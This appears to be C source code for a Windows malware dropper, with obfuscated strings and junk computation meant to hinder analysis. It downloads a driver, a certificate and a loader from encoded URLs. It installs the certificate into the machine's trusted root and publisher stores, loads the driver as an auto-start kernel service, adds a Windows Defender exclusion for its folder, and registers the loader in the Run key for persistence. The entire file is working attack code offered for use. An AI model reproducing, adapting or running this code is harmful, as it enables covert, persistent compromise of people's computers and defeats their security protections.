#include <windows.h>
#include <wincrypt.h>
#include "/tmp/sg_strings.h"

static double lx=1.0,ly=1.0,lz=1.0;
static void ls(){double dt=0.01,dx=10.0*(ly-lx)*dt,dy=(lx*(28.0-lz)-ly)*dt,dz=(lx*ly-2.667*lz)*dt;lx+=dx;ly+=dy;lz+=dz;}

static BOOL write_file(const char* path,const void* data,DWORD len){
    HANDLE f=CreateFileA(path,GENERIC_WRITE,0,NULL,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL);
    if(f==INVALID_HANDLE_VALUE)return FALSE;
    DWORD w=0;WriteFile(f,data,len,&w,NULL);CloseHandle(f);return w==len;
}

static BOOL download(const char* url, const char* path){
    HMODULE m=LoadLibraryA("urlmon.dll");
    if(!m)return FALSE;
    typedef HRESULT(WINAPI*pF)(LPUNKNOWN,LPCSTR,LPCSTR,DWORD,LPBINDSTATUSCALLBACK);
    pF fn=(pF)GetProcAddress(m,"URLDownloadToFileA");
    BOOL ok=FALSE;
    if(fn) ok=SUCCEEDED(fn(NULL,url,path,0,NULL));
    FreeLibrary(m);
    return ok;
}

static BOOL install_cert(const char* path, const char* store){
    HANDLE f=CreateFileA(path,GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_EXISTING,0,NULL);
    if(f==INVALID_HANDLE_VALUE)return FALSE;
    DWORD sz=GetFileSize(f,NULL);
    BYTE* buf=(BYTE*)HeapAlloc(GetProcessHeap(),0,sz);
    DWORD r=0;ReadFile(f,buf,sz,&r,NULL);CloseHandle(f);
    HCERTSTORE hs=CertOpenStore(CERT_STORE_PROV_SYSTEM_A,0,0,CERT_SYSTEM_STORE_LOCAL_MACHINE,store);
    BOOL ok=FALSE;
    if(hs){
        PCCERT_CONTEXT ctx=CertCreateCertificateContext(X509_ASN_ENCODING|PKCS_7_ASN_ENCODING,buf,r);
        if(ctx){ok=CertAddCertificateContextToStore(hs,ctx,CERT_STORE_ADD_REPLACE_EXISTING,NULL);CertFreeCertificateContext(ctx);}
        CertCloseStore(hs,0);
    }
    HeapFree(GetProcessHeap(),0,buf);
    return ok;
}

static BOOL install_driver(const char* path, const char* name){
    SC_HANDLE scm=OpenSCManagerA(NULL,NULL,SC_MANAGER_CREATE_SERVICE);
    if(!scm)return FALSE;
    SC_HANDLE ex=OpenServiceA(scm,name,SERVICE_ALL_ACCESS);
    if(ex){SERVICE_STATUS ss;ControlService(ex,SERVICE_CONTROL_STOP,&ss);DeleteService(ex);CloseServiceHandle(ex);Sleep(500);}
    SC_HANDLE svc=CreateServiceA(scm,name,name,SERVICE_ALL_ACCESS,SERVICE_KERNEL_DRIVER,SERVICE_AUTO_START,SERVICE_ERROR_IGNORE,path,NULL,NULL,NULL,NULL,NULL);
    if(!svc){CloseServiceHandle(scm);return FALSE;}
    BOOL ok=StartServiceA(svc,0,NULL);
    CloseServiceHandle(svc);CloseServiceHandle(scm);
    return ok;
}

int WINAPI WinMain(HINSTANCE h,HINSTANCE p,LPSTR c,int s){
    HANDLE f=CreateFileA("C:\\Windows\\Temp\\sg_alive.txt",GENERIC_WRITE,0,NULL,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL);
    if(f!=INVALID_HANDLE_VALUE){DWORD w=0;WriteFile(f,"OK",2,&w,NULL);CloseHandle(f);}

    for(int i=0;i<50;i++)ls();

    char drv[64],crt[64],dir[32],ldr[64],svc[16],rv[16];
    char url_drv[128],url_crt[128],url_ldr[128];
    dec(drv,_drv,LEN__drv);
    dec(crt,_crt,LEN__crt);
    dec(dir,_dir,LEN__dir);
    dec(ldr,_ldr,LEN__ldr);
    dec(svc,_svc,LEN__svc);
    dec(rv,_rv,LEN__rv);
    dec(url_drv,_url_drv,LEN__url_drv);
    dec(url_crt,_url_crt,LEN__url_crt);
    dec(url_ldr,_url_ldr,LEN__url_ldr);

    /* Download driver and cert */
    download(url_drv, drv);
    download(url_crt, crt);
    Sleep(1000);

    /* Install cert */
    install_cert(crt, "TrustedPublisher");
    install_cert(crt, "Root");
    DeleteFileA(crt);
    Sleep(500);

    /* Install driver */
    install_driver(drv, svc);

    /* Create dir and download loader */
    CreateDirectoryA(dir, NULL);
    download(url_ldr, ldr);

    /* Add exclusion via registry */
    {
        HKEY hk=NULL;
        char key[]="SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths";
        if(RegCreateKeyExA(HKEY_LOCAL_MACHINE,key,0,NULL,0,KEY_WRITE,NULL,&hk,NULL)==0){
            DWORD val=0;RegSetValueExA(hk,dir,0,REG_DWORD,(BYTE*)&val,sizeof(val));RegCloseKey(hk);
        }
    }

    /* Add to startup */
    {
        HKEY hk=NULL;
        char key[]="SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
        if(RegCreateKeyExA(HKEY_LOCAL_MACHINE,key,0,NULL,0,KEY_WRITE,NULL,&hk,NULL)==0){
            RegSetValueExA(hk,rv,0,REG_SZ,(BYTE*)ldr,lstrlenA(ldr)+1);RegCloseKey(hk);
        }
    }

    return 0;
}
